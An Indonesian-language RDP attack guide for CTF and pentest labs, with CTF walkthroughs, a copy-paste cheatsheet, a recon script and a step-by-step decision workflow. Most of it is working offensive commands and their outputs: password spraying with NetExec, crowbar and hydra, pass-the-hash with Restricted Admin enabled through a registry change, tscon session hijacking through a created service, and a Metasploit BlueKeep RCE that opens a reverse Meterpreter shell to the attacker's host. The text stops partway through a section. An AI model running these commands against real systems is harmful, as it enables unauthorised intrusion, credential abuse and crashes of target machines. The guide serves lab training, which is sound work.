* **Solusi CLI**: Pastikan menyertakan parameter domain `/d:<DOMAIN>` atau gunakan format `user@domain.local`:
```bash
xfreerdp /v:$TARGET /u:"user@corp.local" /p:"Password123!" /cert:ignore
```

---

### 4. `Error: Could not connect to <IP>:3389 (Connection Refused / Timeout)`
* **Penyebab**: Layanan RDP dimatikan oleh admin, port dibatasi firewall host, atau RDP berjalan di port non-standar.
* **Solusi CLI**: Lakukan port sweep untuk mendeteksi RDP di port lain:
```bash
sudo nmap -sS -p 3388,3389,3390,8080 -sV $TARGET
```

---

### 5. Jendela `xfreerdp` Tertutup Sendiri / Crash Seketika
* **Penyebab**: Bentrok modul grafis X11 / XFCE atau akselerasi hardware GFX gagal dinegosiasikan.
* **Solusi CLI**: Paksa rendering grafis berbasis software menggunakan flag `/gdi:sw` (sintaks valid di FreeRDP2/FreeRDP3):
```bash
# FreeRDP2 (Standar Parrot OS):
xfreerdp /v:$TARGET /u:$USER /p:$PASS /cert:ignore /size:1280x720 /gdi:sw

# FreeRDP3:
xfreerdp3 /v:$TARGET /u:$USER /p:$PASS /cert:ignore /size:1280x720 /gdi:sw
```

---

### 6. Masalah Layout Keyboard (Karakter yang Diketik Berbeda di RDP)
* **Penyebab**: FreeRDP gagal mendeteksi layout keyboard lokal XFCE.
* **Solusi CLI**: Paksa mapping keyboard ke US English (`0x00000409`):
```bash
xfreerdp /v:$TARGET /u:$USER /p:$PASS /cert:ignore /kbd:0x00000409
```

---

### 7. Fitur Copy-Paste / Clipboard Tidak Berfungsi
* **Penyebab**: Lupa mengaktifkan flag sinkronisasi clipboard atau proses `rdpclip.exe` di Windows target hang.
* **Solusi CLI**: 
  1. Pastikan flag `+clipboard` disertakan saat koneksi.
  2. Jika sudah di dalam sesi Windows dan clipboard mati: Buka Task Manager target, kill proses `rdpclip.exe`, lalu jalankan kembali melalui Run (`Win+R` ➔ `rdpclip.exe`).

---

### 8. Resolusi Layar Terlalu Kecil / Tidak Bisa Di-Resize
* **Penyebab**: Server RDP lama tidak mendukung dynamic resizing.
* **Solusi CLI**: Tentukan ukuran dimensi jendela secara manual:
```bash
xfreerdp /v:$TARGET /u:$USER /p:$PASS /cert:ignore /size:1600x900
```

---

### 9. Sesi RDP Otomatis Terputus Sendiri Setelah Beberapa Menit
* **Penyebab**: Kebijakan GPO domain menetapkan batas waktu idle session limit.
* **Solusi**: Biarkan proses background berjalan (seperti membuka notepad atau memutar script ping) agar sesi tetap dianggap aktif.

---

### 10. Pass-the-Hash Gagal: `Logon failure: the user has not been granted the requested logon type`
* **Penyebab**: Server target menolak Pass-the-Hash karena **Restricted Admin Mode dinonaktifkan**.
* **Solusi**: Restricted Admin Mode wajib diaktifkan terlebih dahulu melalui registry Windows target (`DisableRestrictedAdmin = 0`). Jika Anda belum memiliki admin access, NTLM hash harus di-crack menjadi plaintext menggunakan Hashcat.

---

## 🏆 BAGIAN 9: REAL CTF EXAMPLES

---

### 📝 EXAMPLE 1: LDAP Description Password ➔ RDP GUI Access ➔ User Flag

**Target**: HackTheBox / Proving Grounds Windows Machine

#### Step 1: Ekstraksi Kredensial dari LDAP Description
Dari enumerasi modul [11_ldap_workflow.md — Pentest Workflow: LDAP & Active Directory Enumeration](/docs/ldap), ditemukan akun:
```text
sAMAccountName: j.smith
description: Reset default pass: WelcomeAutumn2024!
```

#### Step 2: Validasi Akses RDP Menggunakan NetExec
```bash
nxc rdp 10.10.11.175 -u 'j.smith' -p 'WelcomeAutumn2024!'
```
* **Output**:
```text
RDP         10.10.11.175    3389   WKSTN01          [+] WKSTN01\j.smith:WelcomeAutumn2024!
```

#### Step 3: Buka Sesi RDP GUI & Ambil User Flag
```bash
xfreerdp /v:10.10.11.175 /u:'j.smith' /p:'WelcomeAutumn2024!' /cert:ignore /dynamic-resolution +clipboard
```
1. Sesi desktop Windows 10 terbuka secara visual.
2. Buka PowerShell di desktop target.
3. Baca flag:
```powershell
Get-Content C:\Users\j.smith\Desktop\user.txt
# Output: f8e7d6c5b4a3...[FLAG]...
```

---

### 📝 EXAMPLE 2: NTLM Hash Dump ➔ Pass-the-Hash via RDP ➔ Administrator Desktop

**Target**: Enterprise Server dengan Restricted Admin Mode Aktif

#### Step 1: Ekstraksi NTLM Hash Administrator dari Secretsdump
Melalui eksploitasi SMB sebelumnya:
```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

#### Step 2: Validasi Restricted Admin Mode via NetExec
```bash
nxc rdp 10.10.11.210 -u 'Administrator' -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```
* **Output**: `[+] CORP\Administrator (Pwn3d!)`

#### Step 3: Login GUI RDP Menggunakan Hash
```bash
xfreerdp /v:10.10.11.210 /u:'Administrator' /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /cert:ignore /restricted-admin +clipboard
```
* **Hasil**: Desktop Administrator berhasil terbuka tanpa perlu melakukan cracking password hash!

---

### 📝 EXAMPLE 3: Low-Priv Shell ➔ RDP Session Hijacking via `tscon` ➔ Takeover Admin

**Target**: Windows Server dengan Multi-User Login (HTB Remote Style)

#### Step 1: Deteksi Sesi Login Administrator dari Command Line
Dari reverse shell port 80/web app, kita berada di sesi low-priv:
```cmd
query session
```
```text
 SESSIONNAME       USERNAME              ID  STATE   TYPE        DEVICE 
 rdp-tcp#0         operator               2  Active                      
 rdp-tcp#4         Administrator          5  Active                      
```

#### Step 2: Dapatkan Hak SYSTEM & Buat Service Pembajakan
Karena user `operator` memiliki hak `SeImpersonatePrivilege` atau izin mengelola service:
```cmd
sc create HijackSvc binpath= "cmd.exe /k tscon 5 /dest:rdp-tcp#0"
net start HijackSvc
```

#### Step 3: Pengambilalihan Sesi Selesai
Seketika jendela RDP `operator` berganti menjadi sesi desktop aktif milik **Administrator** yang sedang membuka konsol Active Directory dan browser internal!

---

## ⚡ BAGIAN 10: CHEATSHEET RDP (COPY-PASTE READY)

Gunakan variabel environment berikut di terminal Parrot OS Anda:

```bash
export TARGET="10.10.11.200"
export USER="Administrator"
export PASS="Password123!"
export DOMAIN="corp.local"
export HASH="31d6cfe0d16ae931b73c59d7e0c089c0"
```

```bash
# ==========================================
# 1. QUICK DETECTION & VALIDATION
# ==========================================
nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption $TARGET # Fingerprint detail
nxc rdp $TARGET                                                 # Cek NLA status instan
nxc rdp $TARGET --screenshot                                    # Ambil gambar pre-auth

# ==========================================
# 2. CREDENTIAL TESTING
# ==========================================
nxc rdp $TARGET -u "$USER" -p "$PASS" -d "$DOMAIN"              # Test single cred
nxc rdp $TARGET -u users.txt -p "$PASS" -d "$DOMAIN" --continue-on-success # Spray

# ==========================================
# 3. INTERACTIVE GUI CONNECT (OPTIMAL CTF)
# ==========================================
# Dynamic Resolution + Clipboard Sync:
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /d:"$DOMAIN" /cert:ignore /dynamic-resolution +clipboard

# Mount Local Linux Folder ke RDP Session:
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore +clipboard /drive:loot,/home/parrot/loot

# Software GDI Rendering Fallback (Jika Crash):
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore /size:1280x720 /gdi:sw

# ==========================================
# 4. PASS-THE-HASH (RESTRICTED ADMIN)
# ==========================================
xfreerdp /v:$TARGET /u:"$USER" /pth:$HASH /cert:ignore +clipboard /restricted-admin

# ==========================================
# 5. SESSION HIJACKING (WINDOWS CMD AS SYSTEM)
# ==========================================
query session                                                   # List active IDs
sc create hijack binpath= "cmd.exe /k tscon <TARGET_ID> /dest:<MY_SESSION>"
net start hijack

# ==========================================
# 6. VULNERABILITY CHECK
# ==========================================
# Cek Kerentanan DoS Legacy MS12-020 (Nmap):
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET

# Cek Kerentanan BlueKeep CVE-2019-0708 (Metasploit Scanner):
msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $TARGET; set VERBOSE false; run; exit"
```

---

## ⚡ BAGIAN 11: AUTOMATION SCRIPT — `rdp_auto_recon.sh`

Script otomasi siap pakai di Parrot OS XFCE untuk mendeteksi status NLA, fingerprinting OS & Domain, verifikasi kerentanan dasar, dan pengujian kredensial RDP:

```bash
#!/bin/bash
# ==============================================================================
# Script Name : rdp_auto_recon.sh
# Description : Otomasi Reconnaissance RDP, NLA Detection, & Credential Check
# Usage       : ./rdp_auto_recon.sh <TARGET_IP> [USER] [PASSWORD] [DOMAIN]
# Example     : ./rdp_auto_recon.sh 10.10.11.200 administrator Pass123! corp.local
# ==============================================================================

TARGET=$1
TEST_USER=$2
TEST_PASS=$3
TEST_DOMAIN=$4
OUTPUT_DIR="./rdp_results_${TARGET}"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <TARGET_IP> [USER] [PASSWORD] [DOMAIN]"
    echo "Contoh: $0 10.10.11.200 administrator Pass123! corp.local"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo -e "\033[1;34m[*] ========================================================\033[0m"
echo -e "\033[1;34m[*] STARTING RDP AUTO RECON: Target $TARGET\033[0m"
echo -e "\033[1;34m[*] ========================================================\033[0m"

# Step 1: Port Scan 3389 TCP & UDP
echo -e "\n\033[1;33m[+] Step 1: Scanning Port 3389 TCP & UDP...\033[0m"
sudo nmap -sS -p 3389 -Pn "$TARGET" -oN "$OUTPUT_DIR/nmap_port3389.txt" 2>/dev/null

if grep -q "open" "$OUTPUT_DIR/nmap_port3389.txt"; then
    echo -e "\033[1;32m[+] Port 3389 RDP Terdeteksi Terbuka!\033[0m"
else
    echo -e "\033[1;31m[-] Port 3389 tidak terbuka atau diblokir firewall.\033[0m"
    exit 1
fi

# Step 2: Fingerprinting NLA, Domain, & OS via NetExec
echo -e "\n\033[1;33m[+] Step 2: Fingerprinting NLA & Target Details via NetExec...\033[0m"
nxc rdp "$TARGET" | tee "$OUTPUT_DIR/netexec_fingerprint.txt"

# Step 3: Nmap NTLM Info & Encryption Check
echo -e "\n\033[1;33m[+] Step 3: Checking Encryption & NTLM Info via Nmap Scripts...\033[0m"
nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption -Pn "$TARGET" -oN "$OUTPUT_DIR/nmap_rdp_info.txt" 2>/dev/null
grep -E "Target_Name|NetBIOS_Domain_Name|Product_Version" "$OUTPUT_DIR/nmap_rdp_info.txt"

# Step 4: Check Vulnerabilities Non-Destructively (MS12-020 & BlueKeep Note)
echo -e "\n\033[1;33m[+] Step 4: Checking Legacy DoS Vulnerability (MS12-020 via Nmap)...\033[0m"
nmap -p 3389 --script rdp-vuln-ms12-020 -Pn "$TARGET" -oN "$OUTPUT_DIR/nmap_vuln.txt" 2>/dev/null
cat "$OUTPUT_DIR/nmap_vuln.txt" | grep -i "vuln" || echo "[-] Target tidak rentan terhadap MS12-020."

echo -e "\n[*] Tip BlueKeep (CVE-2019-0708): Gunakan Metasploit scanner jika target Win7/2008 tanpa NLA:"
echo "    msfconsole -q -x \"use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $TARGET; run; exit\""

# Step 5: Test Credentials (jika parameter user dan pass diberikan)
if [ -n "$TEST_USER" ] && [ -n "$TEST_PASS" ]; then
    echo -e "\n\033[1;33m[+] Step 5: Validating Credentials ($TEST_USER)...\033[0m"
    DOMAIN_FLAG=""
    if [ -n "$TEST_DOMAIN" ]; then
        DOMAIN_FLAG="-d $TEST_DOMAIN"
    fi
    nxc rdp "$TARGET" -u "$TEST_USER" -p "$TEST_PASS" $DOMAIN_FLAG | tee "$OUTPUT_DIR/cred_test.txt"
    
    if grep -q "\[+\]" "$OUTPUT_DIR/cred_test.txt"; then
        echo -e "\033[1;32m[!] LOGIN BERHASIL! Jalankan perintah berikut untuk membuka GUI:\033[0m"
        echo "xfreerdp /v:$TARGET /u:$TEST_USER /p:'$TEST_PASS' $DOMAIN_FLAG /cert:ignore /dynamic-resolution +clipboard"
    fi
fi

echo -e "\n\033[1;34m[*] Recon RDP selesai! Seluruh hasil disimpan di: $OUTPUT_DIR/\033[0m"
```

```bash
# Cara Menjalankan Script di Parrot OS:
chmod +x rdp_auto_recon.sh
./rdp_auto_recon.sh 10.10.11.200 administrator Password123! corp.local
```

---

# RDP Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"         # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
export USER="administrator"
export PASS="Password123!"
export DOMAIN="corp.local"
export HASH=""                     # NTLM hash jika ada (format: LM:NT)
mkdir -p ~/rdp_loot/{screenshots,creds,files,lsass}
cd ~/rdp_loot

echo "[*] Target: $TARGET | User: $USER | Domain: $DOMAIN"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | User: administrator | Domain: corp.local
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI PORT AKTIF

## ═══════════════════════════════════════

### Langkah 0.1 — Ping Test (Deteksi OS via TTL)

Bash

```
ping -c 3 $TARGET
```

**OUTPUT BERHASIL ✅ — TTL ~128 (Windows):**

text

```
64 bytes from 10.10.11.200: icmp_seq=1 ttl=127 time=45.2 ms
```

➡️ **Target Windows** — RDP sangat mungkin ada. Lanjut ke Langkah 0.2.

**OUTPUT GAGAL ❌ — Request timeout:**

text

```
Request timeout for icmp_seq 0
```

➡️ Firewall blokir ICMP. Lanjut ke Langkah 0.2 dengan tambahkan `-Pn` di semua nmap.

---

### Langkah 0.2 — Deteksi Port RDP (Standar + Non-Standar)

Bash

```
# Command 1: Scan port RDP standar + alternatif sekaligus
sudo nmap -sS -sV -p 3389,3388,3390,3391 -Pn $TARGET -oN ~/rdp_loot/nmap_rdp.txt

# Command 2: Jika tidak tahu port, scan semua port common
sudo nmap -sS --top-ports 1000 -Pn $TARGET | grep -E "open|filtered"

# Command 3: Quick check UDP port 3389 (RDP8 acceleration)
sudo nmap -sU -p 3389 --max-retries 1 $TARGET
```

**OUTPUT BERHASIL ✅ — Port 3389 terbuka:**

text

```
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

**OUTPUT BERHASIL ✅ — Port non-standar:**

text

```
3388/tcp open  ms-wbt-server?
3390/tcp open  ms-wbt-server?
```

➡️ Admin pakai port obfuskasi. Set port di semua command berikutnya:

Bash

```
export RDP_PORT="3388"    # Sesuaikan dengan port yang open
```

**OUTPUT GAGAL ❌ — Port filtered/closed:**

text

```
3389/tcp filtered ms-wbt-server
```

➡️ RDP diblokir firewall atau dimatikan. Coba:

Bash

```
# Bypass dengan source port 53
sudo nmap -sS -p 3389 --source-port 53 -Pn $TARGET

# Jika sudah punya shell di target, aktifkan RDP dari dalam:
# (Lanjut ke FASE 7 — Enabling RDP Remotely)
```

---

### Langkah 0.3 — Fingerprint Lengkap (NLA Status, OS, Domain)

Bash

```
# Command 1: NetExec RDP — PALING CEPAT, langsung kasih NLA status
nxc rdp $TARGET

# Command 2: Nmap NTLM Info (lebih detail, termasuk hostname & domain)
nmap -p 3389 --script rdp-ntlm-info -Pn $TARGET

# Command 3: Nmap Encryption Check
nmap -p 3389 --script rdp-enum-encryption -Pn $TARGET

# Command 4: Screenshot pre-auth tanpa login (OSINT dari layar login)
nxc rdp $TARGET --screenshot
# Screenshot disimpan di: ~/.nxc/screenshots/
```

**OUTPUT BERHASIL ✅ — NetExec fingerprint:**

text

```
RDP   10.10.11.200  3389  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:CORP) (nla:True)
```

**Cara baca output ini — PENTING:**

|Field|Nilai Contoh|Arti & Tindakan|
|---|---|---|
|`Windows 10 / Server 2019`|OS Version|Build 17763 = Server 2019|
|`name:DC01`|Hostname|Tambah ke `/etc/hosts`|
|`domain:CORP`|Domain|Environment AD → pivot ke AD|
|`nla:True`|NLA Aktif|**Butuh credentials valid** sebelum bisa connect|
|`nla:False`|NLA Mati|Bisa lihat login screen tanpa creds, cek BlueKeep|

**OUTPUT BERHASIL ✅ — Nmap NTLM Info:**

text

```
| rdp-ntlm-info:
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: corp.local
|   DNS_Computer_Name: DC01.corp.local
|   Product_Version: 10.0.17763
```

➡️ **Set variabel dan tambah ke /etc/hosts:**

Bash

```
export DOMAIN="corp.local"
export HOSTNAME_TARGET="DC01"
echo "$TARGET $DOMAIN DC01.$DOMAIN DC01" | sudo tee -a /etc/hosts
```

**OUTPUT GAGAL ❌ — NLA:False terdeteksi:**

text

```
RDP   10.10.11.200  3389  DC01  [*] Windows 7 / Server 2008 R2 (name:FILE01) (domain:CORP) (nla:False)
```

➡️ **NLA mati = PRE-AUTH ATTACK SURFACE!** Langsung cek BlueKeep:

Bash

```
# Cek CVE-2019-0708 BlueKeep (PALING PENTING jika Windows 7/2008 R2)
msfconsole -q -x "
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;
set RHOSTS $TARGET;
set VERBOSE false;
run;
exit"
```

➡️ Juga ambil screenshot untuk lihat akun apa yang ada di layar login:

Bash

```
nxc rdp $TARGET --screenshot
# Lihat file: ~/.nxc/screenshots/10.10.11.200_screenshot.png
```

**Lanjut ke FASE 1.**

---

## ═══════════════════════════════════════

## FASE 1: CREDENTIAL TESTING & VALIDASI

## ═══════════════════════════════════════

> **Tujuan:** Validasi credentials sebelum membuka GUI RDP. Lebih cepat dan tidak perlu buka jendela grafis.

### Langkah 1.1 — Test Single Credentials

Bash

```
# Command 1: NetExec — validasi cepat tanpa GUI
nxc rdp $TARGET -u "$USER" -p "$PASS" -d "$DOMAIN"

# Command 2: Jika NLA false / tidak yakin domain
nxc rdp $TARGET -u "$USER" -p "$PASS"

# Command 3: Test dengan format user@domain
nxc rdp $TARGET -u "$USER@$DOMAIN" -p "$PASS"

# Command 4: Local auth (bukan domain user)
nxc rdp $TARGET -u "$USER" -p "$PASS" --local-auth
```

**OUTPUT BERHASIL ✅ — Credentials valid:**

text

```
RDP   10.10.11.200  3389  DC01  [+] CORP\administrator:Password123!
```

➡️ Lanjut ke **FASE 3 — RDP GUI Access**.

**OUTPUT BERHASIL ✅ — Admin privileges (Pwn3d!):**

text

```
RDP   10.10.11.200  3389  DC01  [+] CORP\administrator:Password123! (Pwn3d!)
```

➡️ Full admin! Lanjut ke **FASE 3** untuk GUI, atau **FASE 4** untuk Pass-The-Hash persistence.

**OUTPUT GAGAL ❌ — Authentication failure:**

text

```
RDP   10.10.11.200  3389  DC01  [-] CORP\administrator:Password123! 
```

➡️ Credentials salah. Coba variasi:

Bash

```
# Coba tanpa domain
nxc rdp $TARGET -u "$USER" -p "$PASS"

# Coba local auth
nxc rdp $TARGET -u "$USER" -p "$PASS" --local-auth

# Coba format berbeda
nxc rdp $TARGET -u "administrator" -p "$PASS" -d "."
```

**OUTPUT GAGAL ❌ — STATUS_ACCOUNT_LOCKED_OUT:**

text

```
RDP   10.10.11.200  3389  DC01  [-] CORP\administrator STATUS_ACCOUNT_LOCKED_OUT
```

➡️ Akun terkunci! **STOP semua percobaan ke user ini.** Tunggu lockout duration, cek policy:

Bash

```
# Cek lewat SMB/RPC jika bisa
rpcclient -U "" -N $TARGET -c "getdompwinfo" 2>/dev/null | grep "lockout"
# Tunggu duration + 5 menit, lalu coba lagi
```

---

### Langkah 1.2 — Password Spraying via RDP

> **⚠️ PERINGATAN:** RDP spray sangat lambat (1-5 attempt/detik) dan mudah trigger lockout. Cek policy dulu!

Bash

```
# WAJIB: Cek lockout policy sebelum spray
rpcclient -U "" -N $TARGET -c "getdompwinfo" 2>/dev/null
nxc ldap $TARGET -u '' -p '' --pass-pol 2>/dev/null

# Spray dengan NetExec (lebih reliable)
nxc rdp $TARGET \
    -u ~/rdp_loot/users.txt \
    -p 'Welcome2024!' \
    -d "$DOMAIN" \
    --continue-on-success \
    | tee ~/rdp_loot/spray_results.txt

# Filter yang berhasil
grep "\[+\]" ~/rdp_loot/spray_results.txt
```

**OUTPUT BERHASIL ✅:**

text

```
RDP   10.10.11.200  3389  DC01  [+] CORP\j.smith:Welcome2024!
```

➡️ Simpan credentials:

Bash

```
export USER="j.smith"
export PASS="Welcome2024!"
echo "$USER:$PASS" >> ~/rdp_loot/creds/found_creds.txt
```

**OUTPUT GAGAL ❌ — Spray dengan crowbar (jika nxc tidak support):**

Bash

```
# Install crowbar jika belum ada
sudo apt install crowbar -y

# Spray dengan crowbar (specialist untuk RDP)
crowbar -b rdp -s $TARGET/32 \
    -U ~/rdp_loot/users.txt \
    -C ~/rdp_loot/passwords.txt \
    -n 1 \
    -v

# Spray dengan hydra (alternatif)
hydra -L users.txt -p "Welcome2024!" rdp://$TARGET -t 1 -V
```

---

### Langkah 1.3 — NTLM Hash Testing (Pass-The-Hash)

Bash

```
# Test apakah Restricted Admin Mode aktif untuk PtH
# (Hash format: LM:NT atau hanya NT hash)
export HASH="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

# Command 1: NetExec PtH test
nxc rdp $TARGET -u "$USER" -H "$HASH" -d "$DOMAIN"

# Command 2: Cek registry DisableRestrictedAdmin (jika punya shell)
nxc smb $TARGET -u "$USER" -H "$HASH" \
    -x "reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin"
```

**OUTPUT BERHASIL ✅ — PtH valid (Pwn3d!):**

text

```
RDP   10.10.11.200  3389  DC01  [+] CORP\Administrator (Pwn3d!)
```

➡️ Lanjut ke **FASE 4 — Pass-The-Hash via RDP**.

**OUTPUT GAGAL ❌ — PtH ditolak:**

text

```
RDP   10.10.11.200  3389  DC01  [-] CORP\Administrator STATUS_LOGON_FAILURE
```

➡️ Restricted Admin Mode mungkin dinonaktifkan. Jika punya shell, aktifkan dulu:

Bash

```
# Aktifkan Restricted Admin Mode (butuh admin shell dulu)
nxc smb $TARGET -u "$USER" -H "$HASH" \
    -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f'
# Setelah berhasil, coba PtH lagi
```

---

## ═══════════════════════════════════════

## FASE 2: VULNERABILITY SCANNING

## ═══════════════════════════════════════

> **Tujuan:** Cek apakah ada CVE kritis yang bisa langsung kasih shell tanpa credentials.

### Langkah 2.1 — BlueKeep CVE-2019-0708 (Windows 7/Server 2008 R2)

> Prasyarat: Target Windows 7 / Server 2008 R2 dengan NLA = False

Bash

```
# Command 1: Metasploit Scanner (NON-DESTRUKTIF, tidak BSOD)
msfconsole -q -x "
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;
set RHOSTS $TARGET;
set VERBOSE false;
run;
exit"

# Command 2: rdpscan (tool khusus BlueKeep, lebih cepat)
# Install: git clone https://github.com/robertdavidgraham/rdpscan
rdpscan $TARGET --check

# Command 3: Script Python rdp-checker
python3 /opt/rdp-checker.py $TARGET 3389
```

**OUTPUT BERHASIL ✅ — VULNERABLE:**

text

```
[+] 10.10.11.200:3389 - The target is vulnerable. (Windows 7 / Server 2008 R2 without NLA)
```

➡️ **JACKPOT!** Lanjut ke eksploitasi — tapi hati-hati BSOD:

Bash

```
# ⚠️ WARNING: Bisa BSOD! Verifikasi OS dulu
# Cek versi Windows lebih detail
nmap -p 3389 --script rdp-ntlm-info $TARGET | grep Product_Version

# Jika Product_Version: 6.1.7601 → Windows 7 SP1 (target BlueKeep)
# EXPLOIT via Metasploit (RISIKO BSOD TINGGI!)
msfconsole -q -x "
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce;
set RHOSTS $TARGET;
set LHOST $LHOST;
set LPORT $LPORT;
set TARGET 2;
exploit
"
```

**OUTPUT BERHASIL ✅ — Shell setelah exploit:**

text

```
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

➡️ **SYSTEM SHELL!** Lanjut ke **FASE 6 — Post-Exploitation**.

**OUTPUT GAGAL ❌ — BSOD terpicu:**

text

```
[*] Exploit completed, but no session was created.
[-] Target crashed / rebooted
```

➡️ Offset kernel tidak cocok. Coba target type lain atau gunakan metode password-based.

**OUTPUT AMAN ✅ — Not vulnerable:**

text

```
[-] 10.10.11.200:3389 - The target is not vulnerable.
```

➡️ Lanjut ke **Langkah 2.2**.

---

### Langkah 2.2 — DejaBlue CVE-2019-1182 (Windows 10/Server 2019)

Bash

```
# DejaBlue untuk Windows 10/Server 2019 (lebih modern dari BlueKeep)
msfconsole -q -x "
use auxiliary/scanner/rdp/cve_2019_1182_dejablue;
set RHOSTS $TARGET;
run;
exit"

# Cek MS12-020 DoS (Legacy, hanya untuk dokumentasi, jangan trigger di prod!)
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET
```

**OUTPUT BERHASIL ✅ — MS12-020 vulnerable:**

text

```
| rdp-vuln-ms12-020:
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial of Service
```

➡️ DoS vulnerability — untuk dokumentasi pentest report. Jangan trigger di production!

**OUTPUT AMAN ✅ — Semua tidak vulnerable:**

text

```
[-] Not vulnerable to any known RDP CVEs
```

➡️ Target sudah di-patch. Lanjut ke **FASE 1** untuk credential attack.

---

## ═══════════════════════════════════════

## FASE 3: RDP GUI ACCESS & NAVIGATION

## ═══════════════════════════════════════

> **Masuk sini jika:** Credentials valid dari Fase 1 atau Fase 2.

### Langkah 3.1 — Koneksi GUI dengan xfreerdp (STANDAR EMAS CTF)

Bash

```
# Command 1: Koneksi standar PALING OPTIMAL untuk CTF
xfreerdp /v:$TARGET \
    /u:"$USER" \
    /p:"$PASS" \
    /d:"$DOMAIN" \
    /cert:ignore \
    /dynamic-resolution \
    +clipboard

# Command 2: Dengan mount folder lokal (untuk transfer file mudah)
xfreerdp /v:$TARGET \
    /u:"$USER" \
    /p:"$PASS" \
    /d:"$DOMAIN" \
    /cert:ignore \
    /dynamic-resolution \
    +clipboard \
    /drive:loot,/home/parrot/rdp_loot/files

# Command 3: Jika port non-standar
xfreerdp /v:$TARGET:3388 \
    /u:"$USER" \
    /p:"$PASS" \
    /cert:ignore \
    /dynamic-resolution \
    +clipboard

# Command 4: Format UPN (jika /d tidak bekerja)
xfreerdp /v:$TARGET \
    /u:"$USER@$DOMAIN" \
    /p:"$PASS" \
    /cert:ignore \
    /dynamic-resolution \
    +clipboard
```

**OUTPUT BERHASIL ✅ — Jendela RDP terbuka:**

text

```
[INFO][com.freerdp.core] - Loading channelEx rdpdr
[INFO][com.freerdp.core] - Loading channelEx rdpsnd
[INFO][com.freerdp.core] - Loading channelEx cliprdr
# → Jendela Windows desktop muncul!
```

➡️ Setelah masuk desktop Windows, lakukan:

text

```
1. Buka PowerShell/CMD → cek privilege: whoami /all
2. Cek sesi aktif: query session
3. Lihat file desktop dan downloads
4. Cek browser saved passwords
```

**OUTPUT GAGAL ❌ — Certificate verification failed:**

text

```
[ERROR] certificate verification failure
```

➡️ Tambahkan `/cert:ignore`:

Bash

```
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore +clipboard /dynamic-resolution
```

**OUTPUT GAGAL ❌ — CredSSP Encryption Oracle Error (CVE-2018-0886):**

text

```
[ERROR] CredSSP: Could not check TLS credential
A CredSSP authentication failure occurred
```

➡️ Ketidakcocokan versi CredSSP. Coba:

Bash

```
# Turunkan security level ke TLS
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore /sec:tls

# Atau gunakan protokol RDP murni (untuk server sangat lama)
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore /sec:rdp

# Atau gunakan rdesktop untuk Windows XP/2003
rdesktop -u "$USER" -p "$PASS" -d "$DOMAIN" $TARGET
```

**OUTPUT GAGAL ❌ — Authentication failure NLA:**

text

```
[ERROR] Authentication failure, check credentials.
If credentials are valid, the server may not be configured to allow CredSSP
```

➡️ NLA butuh format domain yang benar:

Bash

```
# Coba berbagai format
xfreerdp /v:$TARGET /u:"$DOMAIN\\$USER" /p:"$PASS" /cert:ignore
xfreerdp /v:$TARGET /u:"$USER@$DOMAIN" /p:"$PASS" /cert:ignore
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /d:"$DOMAIN" /sec:nla /cert:ignore
```

**OUTPUT GAGAL ❌ — Jendela crash/tertutup langsung:**

text

```
[ERROR] failed to accept connection
# Jendela langsung tertutup setelah flash sebentar
```

➡️ Masalah rendering grafis. Paksa software rendering:

Bash

```
# FreeRDP2 (standar Parrot OS)
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore /size:1280x720 /gdi:sw

# FreeRDP3
xfreerdp3 /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore /size:1280x720 /gdi:sw

# Coba resolusi lebih kecil
xfreerdp /v:$TARGET /u:"$USER" /p:"$PASS" /cert:ignore /size:1024x768 /gdi:sw
```

**OUTPUT GAGAL ❌ — Connection Refused / Timeout:**

text

```
[ERROR] transport_connect: failed to connect to 10.10.11.200:3389
```

➡️ Port tidak accessible:

Bash

```
# Cek port lain
sudo nmap -sS -p 3388,3389,3390 -Pn $TARGET

# Jika RDP hanya di localhost target → butuh port forwarding
# (ke FASE 7 — Pivot via SSH Tunneling)
```

---

### Langkah 3.2 — Post-Login Enumeration di Desktop

Bash

```
# Setelah berhasil masuk ke Windows desktop, buka PowerShell/CMD

# 1. Cek privilege level
